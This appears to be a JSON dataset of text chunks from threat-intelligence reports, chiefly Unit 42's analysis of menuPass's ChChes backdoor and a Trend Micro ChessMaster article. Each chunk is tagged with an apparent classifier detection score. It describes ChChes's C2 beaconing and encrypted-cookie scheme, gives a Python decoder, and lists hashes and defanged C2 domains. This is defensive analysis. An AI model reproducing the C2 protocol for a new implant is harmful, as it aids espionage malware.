        "text": "This data included a wealth of code used by the organization, including certificates. The certificate in question was fairly old, and expired on August 4th, 2012. On July 10th, 2015, the certificate was revoked.\n\n Figure 5.\u00a0  Digital signing of ChChes\n\nFigure 6.\u00a0 Certificate revocation\nMultiple instances of malware have been discovered using this certificate since it was originally leaked in 2015.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.524935781955719
        },
        "prediction": {}
    },
    {
        "text": "It is unclear why the actors decided to use this certificate that is tied to known malicious samples for their own samples.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7082258462905884
        },
        "prediction": {}
    },
    {
        "text": "When the malware is initially run, it will first decrypt an embedded stub of code within the malware prior to executing it.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6654995679855347
        },
        "prediction": {}
    },
    {
        "text": "This stub has many characteristics seen in shellcode, and begins by creating a new Import Address Table (IAT). This new IAT is then referenced throughout the remainder of the code when calling Windows APIs. The following snippet of assembly shows the newly created IAT being referenced to call various functions, such as GetProcessHeap, RtlAllocateHeap, RtlReAllocateHeap, and InternetReadFile.\n\n Figure 7.\u00a0 Newly created IAT being used to call Windows API functions\nAfter the IAT has been generated, the malware will determine the path of %TEMP% and set its current working directory to this value.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4213015139102936
        },
        "prediction": {}
    },
    {
        "text": "ChChes proceeds to collect the following information about the victim:\n\nHostname\nProcess Identifier (PID)\n Current working directory (%TEMP%)\nWindow resolution\nMicrosoft Windows version\n\nThis information is aggregated into a string such as the following:\nWBQTLJRH9553618*2564?3618468394?C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp?1.4.1 (1024x768)*6.1.7601.17514\nNote",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.48357143998146057
        },
        "prediction": {}
    },
    {
        "text": "that in the string above, the \u20183618468394\u2019 and \u20181.4.1\u2019 strings are hardcoded within the malware itself.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6868280172348022
        },
        "prediction": {}
    },
    {
        "text": "These may indicate versions of the malware or campaign identifiers, however, this has not been confirmed.\n After this data has been aggregated, it is uploaded to a hardcoded command and control (C2) server via HTTP. The data is embedded within the \u2018Cookie\u2019 HTTP header, as seen below\nFigure 8.\u00a0 ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6280182600021362
        },
        "prediction": {}
    },
    {
        "text": "Initial HTTP beacon for ChChes\nThe URI used above is randomly generated for each HTTP request made by ChChes. The data embedded within the Cookie header is encrypted using a unique technique. For each key/value pair, separated by a \u2018;\u2019, the malware will first perform a MD5 hash of the key, and extract the middle 16 bytes.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.64015132188797
        },
        "prediction": {}
    },
    {
        "text": "The value is base64-decoded after the string is unquoted. Finally, the base64-decoded data is decrypted using RC4 with the previously obtained 16 bytes. All of the data is concatenated to form the final, decrypted data.\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6610933542251587
        },
        "prediction": {}
    },
    {
        "text": "The following Python code shows an example of decoding the supplied Cookie field:\n\n\n\n\nimport urllib\nimport base64\nfrom binascii import *\nimport hashlib\n\ndef md5_get_middle(data):\n   ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7160230278968811
        },
        "prediction": {}
    },
    {
        "text": "m = hashlib.md5()\n  m.update(data)\n   o = m.digest()\n  hexed = hexlify(o)\n  return hexed[8:24]\n\ndef rc4_crypt(data, key):\n  S = range(256)\n   ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.3701678216457367
        },
        "prediction": {}
    },
    {
        "text": "[]\n  for i in range(256):\n    j = (j + S[i] + ord( key[i % len(key)] )) % 256\n    S[i] , S[j] = S[j] , S[i]\n   ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4013316333293915
        },
        "prediction": {}
    },
    {
        "text": "i = ( i + 1 ) % 256\n    j = ( j + S[i] ) % 256\n    S[i] , S[j] = S[j] , S[i]\n    out.append(chr(ord(char) ^ S[(S[i] + S[j])",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.37723350524902344
        },
        "prediction": {}
    },
    {
        "text": "% 256]))\n  return ''.join(out)\n\n  cookie_string = 'OtKoVg=jlIt2Eh55%2F%2F38%2FJbKlZpYFNNFhXgOgc0zzNqAxvls8edznJy4k%2BpxKUl1GG15OTRuC%2Blc5R6WGCmOHyPNObeV2OL0ppBty%2Bj3JOsKlUupX%2Fpk6WumT8yLGWtHVQZHZhUxdY%3D;KR9nHItU=MTBOzPjjkPOom89lXeC0A%2Fc%3D'\n\nall_decrypted = \"\"\nsub_strings = cookie_string.split(\";\")\nfor s in sub_strings:\n  key, data = s.split(\"=\")\n  new_key = md5_get_middle(key)\n  new_data = base64.b64decode(urllib.unquote(data))\n  decrypted = rc4_crypt(new_data, new_key)\n  decrypted_data = decrypted.split(key)[1]\n  all_decrypted += decrypted_data\n\nprint \"Decrypted String:\"\nprint repr(all_decrypted)\n\n\n\n\n1234567891011121314151617181920212223242526272829303132333435363738394041\n\nimport urllibimport base64from binascii import *import hashlib\u00a0def md5_get_middle(data):\u00a0\u00a0m = hashlib.md5()\u00a0\u00a0m.update(data)\u00a0\u00a0o = m.digest()\u00a0\u00a0hexed = hexlify(o)\u00a0\u00a0return hexed[8:24]\u00a0def rc4_crypt(data, key):\u00a0\u00a0S = range(256)\u00a0\u00a0 ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.10366033762693405
        },
        "prediction": {}
    },
    {
        "text": "[]\u00a0\u00a0for i in range(256):\u00a0\u00a0\u00a0\u00a0j = (j + S[i] + ord( key[i % len(key)] )) % 256\u00a0\u00a0\u00a0\u00a0S[i] , S[j] = S[j] , S[i]\u00a0\u00a0 ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4013316333293915
        },
        "prediction": {}
    },
    {
        "text": "i = j = 0\u00a0\u00a0for char in data:\u00a0\u00a0\u00a0\u00a0 i = ( i + 1 ) % 256\u00a0\u00a0\u00a0\u00a0j = ( j + S[i] ) % 256\u00a0\u00a0\u00a0\u00a0S[i] , S[j] = S[j] , S[i]\u00a0\u00a0\u00a0\u00a0out.append(chr(ord(char) ^ S[(S[i] + S[j])",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.3665704131126404
        },
        "prediction": {}
    },
    {
        "text": "cookie_string = 'OtKoVg=jlIt2Eh55%2F%2F38%2FJbKlZpYFNNFhXgOgc0zzNqAxvls8edznJy4k%2BpxKUl1GG15OTRuC%2Blc5R6WGCmOHyPNObeV2OL0ppBty%2Bj3JOsKlUupX%2Fpk6WumT8yLGWtHVQZHZhUxdY%3D;KR9nHItU=MTBOzPjjkPOom89lXeC0A%2Fc%3D'\u00a0all_decrypted = \"\"sub_strings = cookie_string.split(\";\")for s in sub_strings:\u00a0\u00a0key, data = s.split(\"=\")\u00a0\u00a0 new_key = md5_get_middle(key)\u00a0\u00a0new_data = base64.b64decode(urllib.unquote(data))\u00a0\u00a0decrypted = rc4_crypt(new_data, new_key)\u00a0\u00a0decrypted_data = decrypted.split(key)[1]\u00a0\u00a0all_decrypted += decrypted_data\u00a0print \"Decrypted String:\"print repr(all_decrypted)\n\n\n\n\n\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.17019814252853394
        },
        "prediction": {}
    },
    {
        "text": "Decrypted String:\n'AWBQTLJRH9553618*2564?3618468394?C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp?1.4.1 (1024x768)*6.1.7601.17514'\n\n\n\n\n12\n\nDecrypted String:'AWBQTLJRH9553618*2564?3618468394?C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp?1.4.1 (1024x768)*6.1.7601.17514'\n\n\n\n\n\nThe initial \u2018A\u2019 character witnessed in the output above instructs the remote server that this is an initial beacon, or the first expected request sent by ChChes.\n The C2 will respond with a \u2018Set-Cookie\u2019 header that contains the middle 16 bytes of the MD5 hash performed against the hostname and PID. Using the above example, the C2 would perform the MD5 against \u2018WBQTLJRH9553618*2564\u2019.\n\n\n\n\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.3198886513710022
        },
        "prediction": {}
    },
    {
        "text": "The subsequent request made by ChChes looks like the following:\n\nFigure 9. Second network request made by ChChes\nDecrypted, we see the following contents stored within the Cookie field:\nBb331106210b6364c\nThe first character of \u2018B\u2019 signifies that this is the second request, and the remaining data is the 16 bytes previously seen in the C2 response within the Set-Cookie header.\n At this stage, the C2 server is expected to return content in the following format:\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6326718330383301
        },
        "prediction": {}
    },
    {
        "text": "[Middle MD5][Base64-Encoded Data][Middle MD5]\nThe \u2018Middle MD5\u2019 field contains the middle 16 bytes of the MD5 hash of the \u2018b331106210b6364c\u2019 string.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6853059530258179
        },
        "prediction": {}
    },
    {
        "text": "The \u2018Base64-Encoded Data\u2019 field contains a fairly complex structure that will store a module that is to be loaded and subsequently run by ChChes.\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7108674645423889
        },
        "prediction": {}
    },
    {
        "text": "A visualization of this network communication can be seen in the following figure:\n\nFigure 10. Network flow of ChChes\nChChes acts as an initial infiltration point on a victim machine.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6414451003074646
        },
        "prediction": {}
    },
    {
        "text": "It has the ability to load additional code that in turn may accomplish any number of tasks.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6919981241226196
        },
        "prediction": {}
    },
    {
        "text": "During analysis, no C2 servers were found to be active, and Unit 42 was unable to identify any modules being loaded by ChChes.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5041656494140625
        },
        "prediction": {}
    },
    {
        "text": "However, the JPCERT also recently analyzed this family and was able to collect modules that give ChChes the following functions:\n\nEncryption of communication by AES\nExecute shell command\nUploading and downloading files\nLoading and executing the DLL\nTask list of bot command\n\nHowever, the lack of persistence built into ChChes suggests that it by itself is not intended to run on a victim\u2019s machine for long periods of time.\u00a0  In a successful intrusion, it may be only a first stage tool used by the attackers to orient where they landed in a network, and other malware will be deployed as a second stage layering for persistence and additional access as the attackers move laterally through a network.\n Conclusion\nThese attacks show Japan continues to be a target of interest to APT campaigns.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.45002883672714233
        },
        "prediction": {}
    },
    {
        "text": "menuPass has targeted individuals and organizations in Japan since at least 2014, and as the same organizations and academics were largely targeted each month in these attacks, it further shows menuPass is persistent in attempts to compromise their targets.\u00a0  menuPass also heavily favors spear phishing, and so takes steps to socially engineer their spear phishes for maximum appearance of legitimacy.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4717341363430023
        },
        "prediction": {}
    },
    {
        "text": "This, and their persistence, highlights the need for training and awareness of spear phishing on the part of both individuals and organizations likely to be targeted. menuPass is an ongoing APT campaign with a broad range of targets and will likely continue to target Japan in the future.\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6216598749160767
        },
        "prediction": {}
    },
    {
        "text": "Palo Alto Networks customers are protected from these malware families and C2 infrastructure by:\n\nAll C2 domains are flagged as malicious in Threat Prevention and PAN-DB\nAll three families are properly tagged malware by WildFire.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4619315266609192
        },
        "prediction": {}
    },
    {
        "text": "Autofocus subscribers can learn more about each family via their tags:\n\nChChes\nPoison Ivy\nPlugX\n\n\n\nAdditionally, Autofocus subscribers can learn more about menuPass by exploring tied activity with the menuPass tag.\nIndicators of Compromise\nSHA256 Hashes\nChChes\n5961861d2b9f50d05055814e6bfd1c6291b30719f8a4d02d4cf80c2e87753fa1\ne90064884190b14a6621c18d1f9719a37b9e5f98506e28ff0636438e3282098b\nae6b45a92384f6e43672e617c53a44225e2944d66c1ffb074694526386074145\nfd6a956a7708708cddff78c8505c7db73d7c4e961da8a3c00cc5a51171a92b7b\n2c71eb5c781daa43047fa6e3d85d51a061aa1dfa41feb338e0d4139a6dfd6910\n316e89d866d5c710530c2103f183d86c31e9a90d55e2ebc2dda94f112f3bdb6d\nefa0b414a831cbf724d1c67808b7483dec22a981ae670947793d114048f88057\n6605b27e95f5c3c8012e4a75d1861786fb749b9a712a5f4871adbad81addb59e\nfadf362a52dcf884f0d41ce3df9eaa9bb30227afda50c0e0657c096baff501f0\n2965c1b6ab9d1601752cb4aa26d64a444b0a535b1a190a70d5ce935be3f91699\ne88f5bf4be37e0dc90ba1a06a2d47faaeea9047fec07c17c2a76f9f7ab98acf0\nd26dae0d8e5c23ec35e8b9cf126cded45b8096fc07560ad1c06585357921eeed\ne6ecb146f469d243945ad8a5451ba1129c5b190f7d50c64580dbad4b8246f88e\n4521a74337a8b454f9b80c7d9e57b4c9580567f84e513d9a3ce763275c55e691\nbc2f07066c624663b0a6f71cb965009d4d9b480213de51809cdc454ca55f1a91\nc21eaadf9ffc62ca4673e27e06c16447f103c0cf7acd8db6ac5c8bd17805e39d\nf251485a62e104dfd8629dc4d2dfd572ebd0ab554602d682a28682876a47e773\nb20ce00a6864225f05de6407fac80ddb83cd0aec00ada438c1e354cdd0d7d5df\nc6b8ed157eed54958da73716f8db253ba5124a0e4b649f08de060c4aa6531afc\n9a6692690c03ec33c758cb5648be1ed886ff039e6b72f1c43b23fbd9c342ce8c\ncb0c8681a407a76f8c0fd2512197aafad8120aa62e5c871c29d1fd2a102bc628\n4cc0adf4baa1e3932d74282affb1a137b30820934ad4f80daceec712ba2bbe14\n312dc69dd6ea16842d6e58cd7fd98ba4d28eefeb4fd4c4d198fac4eee76f93c3\n45d804f35266b26bf63e3d616715fc593931e33aa07feba5ad6875609692efa2\n19aa5019f3c00211182b2a80dd9675721dac7cfb31d174436d3b8ec9f97d898b\n\u00a0\nPlugX\nf1ca9998ca9078c27a6dab286dfe25fcdfb1ad734cc2af390bdcb97da1214563\n6392e0701a77ea25354b1f40f5b867a35c0142abde785a66b83c9c8d2c14c0c3\n6c7e85e426999579dd6a540fcd827b644a79cda0ad50211d585a0be513571586\n9f01dd2b19a1032e848619428dd46bfeb6772be2e78b33723d2fa076f1320c57\n6c7e85e426999579dd6a540fcd827b644a79cda0ad50211d585a0be513571586\n76721d08b83aae945aa00fe69319f896b92c456def4df5b203357cf443074c03\ndcff19fc193f1ba63c5dc6f91f00070e6912dcec3868e889fed37102698b554b\n7eeaa97d346bc3f8090e5b742f42e8900127703420295279ac7e04d06ebe0a04\na6b6c66735e5e26002202b9d263bf8c97e278f6969c141853857000c8d242d24\n5412cddde0a2f2d78ec9de0f9a02ac2b22882543c9f15724ebe14b3a0bf8cbda\n92dbbe0eff3fe0082c3485b99e6a949d9c3747afa493a0a1e336829a7c1faafb\n\u00a0\nPIVY\nf0002b912135bcee83f901715002514fdc89b5b8ed7585e07e482331e4a56c06\n412120355d9ac8c37b5623eea86d82925ca837c4f8be4aa24475415838ecb356\n44a7bea8a08f4c2feb74c6a00ff1114ba251f3dc6922ea5ffab9e749c98cbdce\n9edf191c6ca1e4eddc40c33e2a2edf104ce8dfff37b2a8b57b8224312ff008fe\n\u00a0\nC2s\ndick[.]ccfchrist[.]com\ntrout[.]belowto[.]com\nsakai[.]unhamj[.]com\nzebra[.]wthelpdesk[.]com\narea[.]wthelpdesk[.]com\nkawasaki[.]cloud-maste[.]com\nkawasaki[.]unhamj[.]com\nfukuoka[.]cloud-maste[.]com\nscorpion[.]poulsenv[.]com\nlion[.]wchildress[.]com\nfbi[.]sexxxy[.]biz\ncia[.]toh[.]info\n2014[.]zzux[.]com\n nttdata[.]otzo[.]com\niphone[.]vizvaz[.]com\napp[.]lehigtapp[.]com\njimin[.]jimindaddy[.]com\nJepsen[.]r3u8[.]com\ninspgon[.]re26[.]com\nnunluck[.]re26[.]com\nyahoo[.]incloud-go[.]com\nmsn[.]incloud-go[.]com\nwww[.]mseupdate[.]ourhobby[.]com\ncontractus[.]qpoe[.]com\napple[.]cmdnetview[.]com\ncvnx[.]zyns[.]com\n\u00a0\n\nGet updates from  Palo Alto Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease enter your email address!\n\n\n\n\n\n\n\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.24062298238277435
        },
        "prediction": {}
    },
    {
        "text": "By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5058030486106873
        },
        "prediction": {}
    },
    {
        "text": "Popular ResourcesResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal NoticesPrivacy\nTerms of Use\nDocuments\nAccountManage Subscriptions\n\u00a0\nReport a Vulnerability\n \n\n\n\n\u00a9 2023 Palo Alto Networks, Inc.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.40176922082901
        },
        "prediction": {}
    },
    {
        "text": "This site uses cookies essential to its operation, for analytics, and for personalized content and ads.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.49970605969429016
        },
        "prediction": {}
    },
    {
        "text": "Privacy statementCookies Settings Accept CookiesYour Opt Out Preference Signal is HonoredPrivacy Preference CenterWhen you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5600122809410095
        },
        "prediction": {}
    },
    {
        "text": "This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6724076867103577
        },
        "prediction": {}
    },
    {
        "text": "Because we respect your right to privacy, you can choose not to allow some types of cookies.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5173817873001099
        },
        "prediction": {}
    },
    {
        "text": "Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.\n             More information on cookie consentAllow All Manage Your Consent PreferencesStrictly Necessary CookiesAlways ActiveThese cookies are necessary for the website to function and cannot be switched off in our systems.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.561540961265564
        },
        "prediction": {}
    },
    {
        "text": "They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms. \u00a0 \u00a0",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5568468570709229
        },
        "prediction": {}
    },
    {
        "text": "You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5944161415100098
        },
        "prediction": {}
    },
    {
        "text": "Performance Cookies  Performance Cookies These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6587858200073242
        },
        "prediction": {}
    },
    {
        "text": "They help us to know which pages are the most and least popular and see how visitors move around the site. \u00a0 \u00a0",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7284154891967773
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4701407849788666
        },
        "prediction": {}
    },
    {
        "text": "Functional Cookies  Functional Cookies These cookies enable the website to provide enhanced functionality and personalisation.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7283973693847656
        },
        "prediction": {}
    },
    {
        "text": "They may be set by us or by third party providers whose services we have added to our pages. \u00a0 \u00a0",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5347203612327576
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies then some or all of these services may not function properly.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4902583956718445
        },
        "prediction": {}
    },
    {
        "text": "Targeting Cookies  Targeting Cookies These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites. \u00a0 \u00a0",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5640597343444824
        },
        "prediction": {}
    },
    {
        "text": "They do not store directly personal information, but are based on uniquely identifying your browser and internet device.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5441780686378479
        },
        "prediction": {}
    },
    {
        "text": "Back ButtonCookie List Search IconFilter IconClear checkbox label labelApply CancelConsent Leg. Interest checkbox label label checkbox label label checkbox label label Confirm My Choices",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.45176419615745544
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nChessMaster Makes its Move: A Look into its Arsenal\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBusiness\n\n\n\nsearch\nclose\n\n\n\n\n\n\n\n\n\n\nSolutions\n\n\n\nBy Challenge\n\n\n\n\n\nBy Challenge\n\n\n\n\n\nBy Challenge\nLearn more\n\n\n\n\n\n\n\n\nUnderstand, Prioritize & Mitigate Risks\n\n\n\n\n\nUnderstand, Prioritize & Mitigate Risks\nImprove your risk posture with attack surface management\nLearn more\n\n\n\n\n\n\n\n\nProtect Cloud-Native Apps\n\n\n\n\n\nProtect Cloud-Native Apps\nSecurity that enables business outcomes\nLearn more\n\n\n\n\n\n\n\n\nProtect Your Hybrid World\n\n\n\n\n\nProtect Your Hybrid, Multi-Cloud World\nGain visibility and meet business needs with security\nLearn more\n\n\n\n\n\n\n\n\nSecuring Your Borderless Workforce\n\n\n\n\n\nSecuring Your Borderless Workforce\nConnect with confidence from anywhere, on any device\nLearn more\n\n\n\n\n\n\n\n\nEliminate Network Blind Spots\n\n\n\n\n\nEliminate Network Blind Spots\nSecure users and key operations throughout your environment\nLearn more\n\n\n\n\n\n\n\n\nSee More.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.3202202320098877
        },
        "prediction": {}
    },
    {
        "text": "And like in a game of chess, they are the set pieces that make up their modus operandi.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6705508232116699
        },
        "prediction": {}
    },
    {
        "text": "Take for instance the self-named ChessMaster, a campaign targeting Japanese academe, technology enterprises, media outfits, managed service providers, and government agencies. It employs various poisoned pawns in the form of malware-laden spear-phishing emails containing decoy documents.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5819424390792847
        },
        "prediction": {}
    },
    {
        "text": "And beyond ChessMaster\u2019s endgame and pawns, we also found red flags that allude to its links to APT 10, also known as menuPass, POTASSIUM, Stone Panda, Red Apollo, and CVNX.\n ChessMaster\u2019s name is from pieces of chess/checkers/draughts we found in the resource section of the main backdoor they use against their targets: ChChes, which Trend Micro detects as BKDR_CHCHES.\n What makes the campaign unique is its arsenal of tools and techniques:\n\nMalicious shortcut (LNK) files and PowerShell.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.3910207450389862
        },
        "prediction": {}
    },
    {
        "text": "The LNK files execute Command Prompt that downloads a PowerShell script, which would either directly drop or reflectively load ChChes into the machine.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6716656684875488
        },
        "prediction": {}
    },
    {
        "text": "Self-extracting archive (SFX). An archive that drops an executable (EXE), a dynamic-link library (DLL), and a binary file (.BIN). Upon their extraction, malicious code is injected into the process of a legitimate file/application (DLL hijacking). ChessMaster takes it up a notch via load-time dynamic linking to trigger the malicious DLL\u2019s function.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5321120619773865
        },
        "prediction": {}
    },
    {
        "text": "Their compile dates overlap, which indicates ChChes\u2019 authors take cues and fine-tune their malware.\n Second-stage payloads.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4215666651725769
        },
        "prediction": {}
    },
    {
        "text": "These are actually variants of ChChes that use similar entry points but different and encrypted C&C communication.\n",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4998037815093994
        },
        "prediction": {}
    },
    {
        "text": "ChessMaster draws on legitimate email and browser password recovery and dumping tools they\u2019ve misused and modified for their campaign.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5839968323707581
        },
        "prediction": {}
    },
    {
        "text": "A version of PlugX sans the plug-in functionality that allows it to adopt new capabilities.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6697461605072021
        },
        "prediction": {}
    },
    {
        "text": "A second-stage backdoor that operates like the open-source and fileless remote access Trojan (RAT) Trochilus, which is known for enabling lateral movement in the infected systems.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.618033766746521
        },
        "prediction": {}
    },
    {
        "text": "RedLeaves adopted capabilities from PlugX. In April, a RedLeaves variant named himawari (Japanese for sunflower) emerged capable of evading YARA rules released during that time.\n\n\u00a0\n ChessMaster and APT 10 Plays the Same Cyberespionage Game\nAPT 10/menuPass is a cyberespionage group whose specific campaign, Operation Cloud Hopper, attacked the intermediaries of their targets of interest\u2014managed service providers (MSPs). Its notoriety stems from their prolific use of multifarious information-stealing backdoors and vulnerability exploits, along with the tenacity of its subterfuges, from spear-phishing emails to attack and infection chains.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.36908072233200073
        },
        "prediction": {}
    },
    {
        "text": "If that sounded familiar, it's because ChessMaster and APT 10 appear to be playing the same cyberespionage game. Here\u2019s a further illustration:\nFigure 1: Similarities in ChessMaster and APT 10\u2019s attack chain\nWe first saw ChChes set its sights on an organization that\u2019s long been a target of APT 10/menuPass.",
        "source": "ChessMaster Makes its Move_ A Look into its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5607371926307678
        },
        "prediction": {}
    },
    {
